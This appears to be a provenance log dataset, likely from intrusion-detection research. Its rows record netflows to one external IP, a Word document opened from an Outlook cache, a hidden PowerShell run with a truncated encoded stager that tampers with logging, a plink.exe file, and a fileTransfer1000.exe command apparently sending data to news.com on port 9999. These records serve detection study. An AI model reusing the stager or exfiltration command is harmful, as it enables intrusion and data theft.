e4e82d48-24f1-463f-b1d4-0726da49edb4,{'netflow': '142.20.57.246:53886->202.6.172.98:443'},845825
429232e5-6a83-4051-9985-32ea421f19ec,"{'subject': '%SystemRoot%/system32/csrss.exe %SystemRoot%/system32/csrss.exe ObjectDirectory=/Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'}",5650
d63c1192-9ccb-4b2c-913f-22f7c5b03d30,{'netflow': '142.20.57.246:53304->202.6.172.98:443'},824854
afb688ea-7298-44da-bcbd-23d60c4643aa,{'netflow': '202.6.172.98:443->142.20.57.246:53943'},853533
427c5d12-01ed-4c79-b631-cd54f53db256,{'netflow': '142.20.57.246:53961->202.6.172.98:443'},855583
c0e29714-5b17-4cf6-99a2-d82a35da6d36,{'subject': '/Device/HarddiskVolume1/Windows/system32/SearchProtocolHost.exe None'},5665
4990633f-4bcf-4ac0-b6a1-6ba6c2d7352e,{'netflow': '202.6.172.98:443->142.20.57.246:53881'},845358
847d09d8-a4e8-4be8-95ef-aaade0782ac2,{'netflow': '202.6.172.98:443->142.20.57.246:53911'},847407
04718ec1-0510-44bb-8ca3-7eaffa9f384a,{'netflow': '142.20.57.246:53935->202.6.172.98:443'},851512
53f39396-f687-48b4-a4cf-42d00d5b6edf,{'netflow': '142.20.57.246:53922->202.6.172.98:443'},849466
acdbee39-aa42-4a94-92f0-e3c4c7e8fdb0,{'netflow': '142.20.57.246:53367->202.6.172.98:443'},828989
1cecf607-ff7b-4f1b-9f3a-1f5dcd9b494a,{'netflow': '142.20.57.246:53339->202.6.172.98:443'},826942
903f520d-4abd-4fd7-b5e8-566f7c63ee81,{'netflow': '202.6.172.98:443->142.20.57.246:53367'},828992
ad283fd5-af13-4cae-976d-5ea94d121a78,{'netflow': '142.20.57.246:53368->202.6.172.98:443'},828993
2bac8b6d-8335-48e4-8811-f8a811bc23c9,{'netflow': '142.20.57.246:53369->202.6.172.98:443'},828994
ea31c2f7-1cf2-4b29-8c98-1b71808510ac,{'netflow': '202.6.172.98:443->142.20.57.246:53304'},824899
0b21c4c2-58dc-4ad5-b7bb-2b55f59dff42,{'netflow': '202.6.172.98:443->142.20.57.246:53935'},851524
fcff2b85-7660-4c6b-b99f-0e3f0121ee01,{'netflow': '202.6.172.98:443->142.20.57.246:54064'},861767
adecf527-035e-4828-9e2d-860faba8dde3,{'netflow': '202.6.172.98:22->142.20.57.246:54065'},861768
c9f7d6b4-f269-4596-8523-ac750177cf32,{'netflow': '202.6.172.98:443->142.20.57.246:53368'},828999
157535a9-33b5-47eb-b3a4-3e078d87cd54,{'netflow': '202.6.172.98:443->142.20.57.246:53491'},841291
37908885-40aa-4a21-a0ff-3aea592f000c,{'netflow': '142.20.57.246:53440->202.6.172.98:443'},835148
a8e1af84-0eed-4487-82cb-3a55f4f70392,{'netflow': '202.6.172.98:443->142.20.57.246:53440'},835149
5e0349f1-8402-4761-9bc8-4bc32d83cfa3,{'netflow': '202.6.172.98:443->142.20.57.246:49993'},808528
ea91d766-22ed-459b-bf15-b5f807b47409,{'netflow': '142.20.57.246:53280->202.6.172.98:443'},822866
ab2309f9-d567-446f-9d9b-7d81c7d5d199,{'netflow': '202.6.172.98:443->142.20.57.246:53280'},822877
42aa340a-c0b3-4723-aec0-95d2126f0a36,{'netflow': '142.20.57.246:50006->202.6.172.98:443'},810590
7bb40a6b-52bc-44be-b1f2-d4c6e4bbf46a,{'netflow': '142.20.57.246:49958->202.6.172.98:443'},804446
5853dbd8-2adf-468f-b275-3ed5e2e92fee,{'netflow': '142.20.57.246:53944->202.6.172.98:443'},853603
4455be06-ee44-4a79-bc11-256e3f72a4fa,{'netflow': '202.6.172.98:443->142.20.57.246:53961'},855652
b1587d8f-0e1b-479e-bce7-2737fc509e23,{'netflow': '202.6.172.98:443->142.20.57.246:53944'},853605
fdb482c9-5338-47b6-ac00-e5d7227c1a70,{'netflow': '142.20.57.246:53990->202.6.172.98:443'},857701
1b6a9bfb-f741-4117-8ec3-8cf064e7294e,{'netflow': '142.20.57.246:50007->202.6.172.98:443'},810595
7c360e51-97ad-4fdf-b627-bd761cc8399f,{'netflow': '202.6.172.98:443->142.20.57.246:53990'},857706
b3708918-71bc-4c9e-adff-76e093552da7,{'netflow': '202.6.172.98:443->142.20.57.246:50006'},810604
0013f57d-321e-4d79-b788-976d44e3006e,{'netflow': '202.6.172.98:443->142.20.57.246:50007'},810605
d8380b63-698d-4c94-a64e-c7faf28732a5,{'netflow': '142.20.57.246:50128->202.6.172.98:443'},812662
89dae5ad-f1e8-4a26-a60b-77251a6b5d20,{'netflow': '142.20.57.246:50129->202.6.172.98:443'},812663
ebb01ed9-1302-4af1-8c4c-22312d6468ec,{'netflow': '142.20.57.246:53281->202.6.172.98:443'},822904
d741f163-d0b3-40f0-89a0-bbc904c42901,{'netflow': '142.20.57.246:53340->202.6.172.98:443'},827001
917db26d-0ad4-4f68-ad76-1c7e3d063bb5,{'netflow': '142.20.57.246:49978->202.6.172.98:443'},806524
78360c9b-f891-4c2f-8a2c-9ff9783f48ad,{'netflow': '142.20.57.246:53936->202.6.172.98:443'},851581
3237926c-44bf-48f6-ba77-e4591b6c4d52,{'netflow': '142.20.57.246:50008->202.6.172.98:443'},810622
b5148b27-371f-401d-8421-7ae72079b7ee,{'netflow': '202.6.172.98:443->142.20.57.246:53936'},851582
6f3954ed-d1cd-43ba-ad32-b59408cb76b2,{'netflow': '142.20.57.246:50009->202.6.172.98:443'},810623
834c7fcb-9099-4406-bea6-ae8822255136,{'netflow': '202.6.172.98:443->142.20.57.246:53339'},827008
9eee5def-e5a5-42ee-a045-808ed70ad4af,{'netflow': '202.6.172.98:443->142.20.57.246:50129'},812672
3b8b25f9-4566-4214-98e2-6059b42a0917,{'netflow': '202.6.172.98:443->142.20.57.246:53281'},822913
33c00aff-509a-4e30-a662-336696844353,{'netflow': '202.6.172.98:443->142.20.57.246:53481'},839298
aa1d206c-e401-45fd-a3fc-08a9dd7b4285,{'netflow': '202.6.172.98:443->142.20.57.246:50128'},812673
cdee0997-359a-4db8-bbe6-118fbe92a96d,{'netflow': '142.20.57.246:53884->202.6.172.98:443'},845445
bb936ea1-4a0f-424a-8d9b-890665ce63eb,{'netflow': '142.20.57.246:53481->202.6.172.98:443'},839297
559e9806-2aa1-47e2-a180-68298a91a946,{'netflow': '202.6.172.98:443->142.20.57.246:50008'},810631
f79ec1eb-64b4-4dbe-9176-0e9426e0220c,{'netflow': '202.6.172.98:443->142.20.57.246:49978'},806530
4acd096a-a2f8-483f-a11f-175932fe8e93,{'netflow': '142.20.57.246:53429->202.6.172.98:443'},833164
08d711a9-ab76-4035-a1d4-e91f3be546b6,{'subject': '/Device/HarddiskVolume1/Windows/System32/mobsync.exe None'},5773
0e0e08e5-dc27-4460-a3a5-41105a7c4db8,{'netflow': '202.6.172.98:443->142.20.57.246:53369'},829086
4be52b0c-6e01-4bc4-b27f-5c7ef1e1fdac,{'netflow': '202.6.172.98:443->142.20.57.246:53429'},833186
37537783-4b0e-4aaf-9a07-4b4b30624b0a,{'netflow': '142.20.57.246:49994->202.6.172.98:443'},808611
5fdbe8cf-807f-4f73-bbc6-b09d5356c185,{'netflow': '202.6.172.98:443->142.20.57.246:53340'},827043
412bda08-1aa2-4374-be9d-8e6ae231daa9,{'netflow': '142.20.57.246:53370->202.6.172.98:443'},829101
c8d10386-379c-4bff-bd04-61ae0003da85,{'netflow': '142.20.57.246:53371->202.6.172.98:443'},829102
801d727e-4ad1-4516-9bf6-b41cc1dbdea9,{'netflow': '202.6.172.98:443->142.20.57.246:49994'},808627
c9e0238a-1cdf-4a5e-9ab6-cbfea0bd8c4a,"{'subject': '/Device/HarddiskVolume1/Windows/system32/svchost.exe ""C:/Program Files (x86)/Microsoft Office/Office15/WINWORD.EXE"" /n ""C:/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx"" /o """"'}",3770
91cf6eed-6ee7-43aa-a2d0-62e81ca89e2e,"{'subject': '/Device/HarddiskVolume1/Windows/system32/lsass.exe ""C:/Program Files (x86)/Microsoft Office/Office15/WINWORD.EXE"" /n ""C:/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx"" /o """"'}",3771
3c7b52b8-f6b4-45b5-9632-4a857197fd61,{'netflow': '202.6.172.98:443->142.20.57.246:53390'},831169
8f610c63-d117-4c64-8412-ced8aa6b30d0,{'netflow': '202.6.172.98:443->142.20.57.246:50009'},810692
f5552091-0e7f-4d76-bcd7-6fdb8c6ce778,{'netflow': '142.20.57.246:53390->202.6.172.98:443'},831173
53a7fc38-8fe7-4ec1-a608-0ea117b8dd47,{'netflow': '202.6.172.98:443->142.20.57.246:53884'},845510
1d6d84c7-695b-4f9d-b2ed-bd26e5d1bfcc,{'netflow': '142.20.57.246:54001->202.6.172.98:443'},859847
283cbadc-58f9-40f8-b743-4e72039b32bb,{'netflow': '142.20.57.246:53945->202.6.172.98:443'},853703
d41d6558-a4ff-4d15-a772-767095a9f86d,{'netflow': '202.6.172.98:443->142.20.57.246:49958'},804554
72d1d7c6-dae4-42af-b726-3da605f73c0e,{'netflow': '142.20.57.246:53991->202.6.172.98:443'},857803
76216d35-1375-4957-958d-16c97b049fdc,{'netflow': '142.20.57.246:53914->202.6.172.98:443'},847567
d514b613-d5c8-4377-9ff9-2dbeee33c00d,{'netflow': '202.6.172.98:443->142.20.57.246:54001'},859856
ac94a091-609f-467e-8392-de1c73bc73d2,{'netflow': '202.6.172.98:443->142.20.57.246:53991'},857810
2ea61a98-febd-49ec-9c47-81a31884b0c0,{'netflow': '142.20.57.246:53482->202.6.172.98:443'},839383
8ee15ca0-1964-416c-9862-2e89d843186f,{'netflow': '142.20.57.246:49964->202.6.172.98:443'},804567
6c9cc27c-6fb2-4411-b69f-8d918b950b7a,{'netflow': '142.20.57.246:53441->202.6.172.98:443'},835289
1c205927-e71f-47ed-84a7-5a4ea9f86264,{'netflow': '142.20.57.246:53305->202.6.172.98:443'},825050
01bc0dc5-3dd6-4297-8a0a-2b8be2703f32,{'netflow': '142.20.57.246:53306->202.6.172.98:443'},825051
a1e82a8c-13fb-4be9-8c52-5ec82895e9a7,{'netflow': '202.6.172.98:443->142.20.57.246:53482'},839388
7d8c6ab8-8ddb-4164-a0a7-f66eb91bbb74,{'netflow': '202.6.172.98:443->142.20.57.246:53305'},825058
0979f91f-2641-4bf2-a4c2-d462b2a650d7,{'netflow': '202.6.172.98:443->142.20.57.246:53306'},825059
3c241579-d454-47e6-9165-ed0bf144d90b,{'netflow': '142.20.57.246:51163->202.6.172.98:443'},814821
5fc70892-70f0-4383-9028-57439e79d21a,{'netflow': '202.6.172.98:443->142.20.57.246:53441'},835304
a205ebce-d02a-47b5-8fad-691ff8d32f29,{'netflow': '202.6.172.98:443->142.20.57.246:53922'},849643
054df7d9-801e-49d0-b8cd-4f20b42a4305,{'subject': '/Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe None'},3820
f202fb64-9a1a-4e45-930c-6c10266aab59,{'netflow': '142.20.57.246:53492->202.6.172.98:443'},841453
98f5435f-b4c8-420d-af01-d3b530805cad,{'netflow': '142.20.57.246:53430->202.6.172.98:443'},833262
55016343-af49-4fdd-9714-194a0bd8ae76,{'netflow': '142.20.57.246:50130->202.6.172.98:443'},812783
ca664460-47c5-40f0-ab95-e7f98b54a566,{'netflow': '202.6.172.98:443->142.20.57.246:50130'},812784
4524e03f-6ea7-47a3-84f2-84016d53dab8,"{'subject': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe""'}",5880
946b9e95-68be-4003-ae5b-9a45ffafcdf1,{'netflow': '142.20.57.246:53962->202.6.172.98:443'},855801
7a7ed319-25c7-4fd9-87c3-c1891ea6bb35,{'netflow': '202.6.172.98:443->142.20.57.246:53945'},853754
1a4bfafc-54e7-432d-9bdd-9edf33150e79,{'netflow': '142.20.57.246:50136->202.6.172.98:443'},812793
daec9d1f-b6ad-4250-84c5-99f0156349e5,"{'subject': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe"" --help'}",5881
60c6a2ba-fe79-4d5e-853f-8d4dd57f0faa,{'subject': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe None'},5883
2a7d5baa-002d-4708-a8e6-e259e64bc00b,{'netflow': '202.6.172.98:443->142.20.57.246:50136'},812799
47d9c284-eb47-4aea-a264-e3920cae7f30,{'netflow': '142.20.57.246:53946->202.6.172.98:443'},853762
6cc3d0bd-4c0a-4ef1-ad78-2819c7a9930c,{'netflow': '202.6.172.98:443->142.20.57.246:53946'},853763
185264a8-6bbc-41c9-8f75-8454fdcc44ef,{'netflow': '202.6.172.98:443->142.20.57.246:49964'},804625
fae98e00-589c-4e36-a2b6-116dda93abfc,{'netflow': '202.6.172.98:443->142.20.57.246:53914'},847636
f27952da-f8b7-4447-bdc2-ee086d205721,{'netflow': '142.20.57.246:51149->202.6.172.98:443'},814870
98e71d27-952a-4353-bd00-88a1d1f9101e,{'netflow': '202.6.172.98:443->142.20.57.246:53492'},841494
9001a320-1e78-4742-af73-e32c42cf3cf9,{'file': '/Device/HarddiskVolume1/Windows/system32/plink.exe'},89883
1298e1db-2fe8-4947-a75c-ac715840c729,{'netflow': '142.20.57.246:49980->202.6.172.98:443'},806690
3551dcff-0d4f-45a8-b5ad-5315abc1f408,{'netflow': '142.20.57.246:49969->202.6.172.98:443'},804644
8dec7284-b38b-4622-b4e0-4f89b0195e25,{'netflow': '202.6.172.98:443->142.20.57.246:53430'},833317
36e36edb-7bc2-40aa-b7ca-7ce12e69a9a3,{'netflow': '142.20.57.246:49995->202.6.172.98:443'},808755
0a27ecf7-604a-430f-91ef-e5b4ab3b7838,{'netflow': '202.6.172.98:443->142.20.57.246:49995'},808760
0d299ce5-0ce3-4321-9883-f16fe34de77a,{'netflow': '142.20.57.246:53947->202.6.172.98:443'},853819
3fe64796-b205-4058-b68e-189cb0d3ef17,{'netflow': '202.6.172.98:443->142.20.57.246:53947'},853822
49a7973d-31bb-4574-9e74-a70454f62acf,{'subject': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe None'},5956
5f469a02-2687-4c78-b5cb-df733f3f661c,{'netflow': '202.6.172.98:443->142.20.57.246:53962'},855884
f7622acd-5f97-4b79-8713-853a861de0c3,{'netflow': '142.20.57.246:54002->202.6.172.98:443'},859980
0a5884dc-a64b-4850-be65-421b2f6b773a,{'netflow': '142.20.57.246:53798->202.6.172.98:443'},843601
fddb42aa-3109-42da-ab73-351dafc700df,{'netflow': '202.6.172.98:443->142.20.57.246:53370'},829266
02395f37-2853-4b1e-854b-ee60e5e458a9,{'netflow': '202.6.172.98:443->142.20.57.246:53371'},829267
7933d10b-2cd6-4eaa-983c-263ecb6ea7c0,{'netflow': '142.20.57.246:53993->202.6.172.98:443'},857938
c8853dee-9084-4862-a6a6-94d6d8d5f449,{'netflow': '142.20.57.246:53373->202.6.172.98:443'},829269
4c8da503-a5e3-40b6-b8f2-bfe03467f240,{'netflow': '142.20.57.246:53341->202.6.172.98:443'},827222
7b2a1fac-fa74-437b-a43a-147fd0f786a1,{'netflow': '202.6.172.98:443->142.20.57.246:54002'},859990
f7f45c8a-5b49-4f86-9c3f-8b3de11559ac,{'netflow': '142.20.57.246:53372->202.6.172.98:443'},829268
7ef24c01-dbda-42d4-ae6a-af018eff3cba,{'netflow': '142.20.57.246:53456->202.6.172.98:443'},837465
4198a4d8-ab84-4ca1-926a-50a94c76471a,{'netflow': '142.20.57.246:53309->202.6.172.98:443'},825178
381d9f06-205b-4373-8803-9805573619aa,{'subject': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe None'},5970
29733f9f-bd8d-4b68-bec4-e595638770c8,{'netflow': '202.6.172.98:443->142.20.57.246:53309'},825185
c7fef3f6-3ac7-4a24-9239-673435b7b393,{'netflow': '142.20.57.246:53442->202.6.172.98:443'},835429
9b982a36-0db7-4beb-9043-e0cd4286d68f,{'netflow': '142.20.57.246:53483->202.6.172.98:443'},839529
6f332007-2676-41cb-9461-6d60bf2b3f08,{'netflow': '142.20.57.246:53948->202.6.172.98:443'},853873
ad844212-0c75-40f6-bad7-cf7546e35d87,{'netflow': '142.20.57.246:53374->202.6.172.98:443'},829298
619d6d77-cd87-4fea-b4c1-594788bbd011,{'netflow': '142.20.57.246:53885->202.6.172.98:443'},845683
3d273314-76e8-4858-90a5-71dd7f6a2588,{'netflow': '202.6.172.98:443->142.20.57.246:53948'},853874
03fb6007-9fa8-4ce9-8a3b-5d25cba807a7,{'netflow': '202.6.172.98:443->142.20.57.246:53456'},837498
8a349cc7-6a84-42b6-be0e-bf758834cea0,{'netflow': '202.6.172.98:443->142.20.57.246:53993'},857981
2ce1ffbf-fad6-4e27-a3c1-2f23698c514e,{'netflow': '142.20.57.246:53915->202.6.172.98:443'},847741
884473a5-c865-47c4-9cbb-d7bf1d8ccbd2,{'netflow': '142.20.57.246:53937->202.6.172.98:443'},851847
072062cb-4329-403a-844e-72a70d9ac6a0,{'netflow': '202.6.172.98:443->142.20.57.246:53798'},843656
45a2d390-245f-4bf1-97f9-dd9422ed8cce,{'file': '/Device/HarddiskVolume1/windows/system32/mobsync.exe'},79751
c176a339-c0b7-41f1-98f5-87ec4acd7e79,{'netflow': '202.6.172.98:443->142.20.57.246:53442'},835466
ac67918f-cd3a-4a83-b14f-7ff779255471,{'netflow': '142.20.57.246:53282->202.6.172.98:443'},823180
e519a49c-b940-41ca-b570-8fc4568779f6,{'netflow': '202.6.172.98:443->142.20.57.246:53483'},839566
3faba69a-8c4f-4ae4-b292-54c374a6533e,{'subject': 'powershell.exe C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB'},3986
276f0283-fe2b-41cc-b9c7-b9912b21b7f4,{'netflow': '202.6.172.98:443->142.20.57.246:53885'},845716
b6f1489e-839f-4b12-b97d-6bb5b3caafae,{'netflow': '202.6.172.98:443->142.20.57.246:49980'},806806
262151aa-40e1-48a2-b98b-9c92aae4e7d1,{'netflow': '202.6.172.98:443->142.20.57.246:53392'},831383
fc9feb4a-14cc-4a2d-ba93-27dbe5c390dc,{'netflow': '202.6.172.98:443->142.20.57.246:49969'},804765
ae8be5bc-0b48-4c8b-a59b-225221f6a6c9,{'netflow': '142.20.57.246:53392->202.6.172.98:443'},831389
281edc04-1ee7-4f6c-b274-cdc16b30da87,{'subject': 'powershell.exe None'},4002
9ffae81a-3c51-40b1-9789-b19c1980a755,{'subject': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe None'},6053
97190465-6df3-4923-a534-2ef6571fa299,{'netflow': '202.6.172.98:443->142.20.57.246:53372'},829353
d7c1b8ca-b9c5-4ddd-a5f7-b6eb91ccb73d,{'netflow': '202.6.172.98:443->142.20.57.246:53373'},829354
92f601d0-66a2-4bce-a928-1277d3d276dc,{'netflow': '202.6.172.98:443->142.20.57.246:53282'},823211
5931cc4c-cf2a-4918-8ddd-8bc705673b48,{'netflow': '142.20.57.246:53432->202.6.172.98:443'},833452
dc5c5a17-6f3e-49a8-b0ee-5b063676db1d,{'netflow': '202.6.172.98:443->142.20.57.246:53915'},847791
c6276338-28ed-4b24-b347-71b0c7daadaa,{'netflow': '142.20.57.246:53923->202.6.172.98:443'},849845
dbb615e3-1e9f-45f3-a926-52b00ff7ac3c,{'subject': '/SystemRoot/System32/smss.exe fileTransfer1000.exe  news.com 9999 '},6072
2ca6f0e0-c7b4-4db7-87eb-72ce7802d4dc,{'netflow': '142.20.57.246:53950->202.6.172.98:443'},853948
dfa8e8ed-aff0-4932-aca3-2e394fb2d732,{'netflow': '202.6.172.98:443->142.20.57.246:53923'},849854
86cdc47a-a13e-4bc4-a5f2-012586bfcd96,{'netflow': '142.20.57.246:53484->202.6.172.98:443'},839617
cd25fad9-f2c5-45ce-926e-8f30ffebaada,{'netflow': '202.6.172.98:443->142.20.57.246:53950'},853954
822fdbe8-d1ea-4a62-9d98-1be3d6dae5fa,{'netflow': '142.20.57.246:53249->202.6.172.98:443'},821185
d72b57fa-3a96-41f4-8b55-af004214b6c8,{'netflow': '142.20.57.246:53310->202.6.172.98:443'},825282
f6f8ac66-f791-404c-91a4-6d82d37f4234,{'netflow': '142.20.57.246:49996->202.6.172.98:443'},808901
62fc2e0c-b65f-46f5-9eb5-dd86c9aba946,{'netflow': '142.20.57.246:53952->202.6.172.98:443'},853959
4d90f34c-ced7-4265-b51c-6aa8b66f4b7e,{'netflow': '202.6.172.98:443->142.20.57.246:53484'},839626
9b0478ba-9ede-4925-82c1-a890728b74d9,{'netflow': '202.6.172.98:443->142.20.57.246:53432'},833483
5fd553a7-a99f-4d00-b375-2e956186aebd,{'netflow': '202.6.172.98:443->142.20.57.246:53952'},853962
fb2bf7eb-66c0-4324-ab27-1ec5ccea660a,{'netflow': '202.6.172.98:443->142.20.57.246:53937'},851928
9fd478e3-4cda-4b7c-92c2-266362a1558d,{'netflow': '142.20.57.246:53916->202.6.172.98:443'},847839
d1227a7d-b46c-4397-8ae5-cfb1aaa10f0c,{'netflow': '202.6.172.98:443->142.20.57.246:49996'},808929
cb99d523-2af9-42f7-933f-c365aedadf5c,{'netflow': '142.20.57.246:53497->202.6.172.98:443'},841697
3c5fb65e-4d08-43d9-a121-928d0a083a92,{'netflow': '142.20.57.246:53342->202.6.172.98:443'},827361
2e22d24d-0a6a-49dd-bf1a-ab372d4c9d91,{'netflow': '142.20.57.246:49970->202.6.172.98:443'},804834
b230dfac-242d-4b7b-9c10-d5a3a970eb62,{'netflow': '202.6.172.98:443->142.20.57.246:49970'},804837
50124e85-32e5-4673-9839-f9e88a2b7506,{'netflow': '142.20.57.246:53283->202.6.172.98:443'},823266
55a0dadd-8f8d-4476-9ccf-a4c344243ae5,{'netflow': '202.6.172.98:443->142.20.57.246:53249'},821226
aebf3477-bf87-4a40-beb9-7914d1b54a96,{'netflow': '202.6.172.98:443->142.20.57.246:53283'},823275
e47673a6-56aa-4a74-af72-1e0b4aab396c,{'netflow': '202.6.172.98:443->142.20.57.246:53341'},827370
c38a812a-74dd-456f-91b4-d2bc606f3d6b,{'netflow': '202.6.172.98:443->142.20.57.246:53310'},825333
f271f13b-31f7-4ba4-9c42-a7c1692244af,{'netflow': '142.20.57.246:53443->202.6.172.98:443'},835577
d6c30d9f-cbe0-47c5-873b-ee15996d646b,{'netflow': '142.20.57.246:54003->202.6.172.98:443'},860156
